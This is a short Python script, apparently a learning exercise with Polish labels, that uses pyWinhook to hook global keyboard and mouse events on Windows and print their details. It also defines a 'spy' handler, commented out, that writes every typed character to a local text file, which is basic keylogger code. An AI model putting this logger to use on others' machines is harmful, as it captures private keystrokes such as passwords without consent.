import pythoncom
from pyWinhook import HookManager
def onAllKeys(event):
    print("klwisz: "+event.Key)
    print("ASCII:" + chr(event.Ascii))
    print("Alt: ",event.IsAlt())
    print("StateInjected:", event.Injected)
    print("StateExtended:" , event.Extended)
    print("Transition:",event.Transition)
    print("-------------------------------------")
    return True
def onMouse(event):
    print("Pozycja Myszy: ",event.Position)
    print("Weel:",event.Wheel)
    print("------------")
    return True
def spy(event):
    file = open("file.txt","a",encoding="UTF-8")
    if event.GetKey() not in ("Lshift","LMenu"):
        file.write(chr(event.Ascii))
    elif event.GetKey() == "Return":
        file.write("\n")
    file.flush()
    file.close()
    return True
def tester(event):
    print(event.GetKey())
    return True
hook = HookManager()
hook.HookKeyboard()
hook.HookMouse()
hook.KeyAll = onAllKeys
hook.MouseAll = onMouse
#hook.KeyAll = spy
pythoncom.PumpMessages()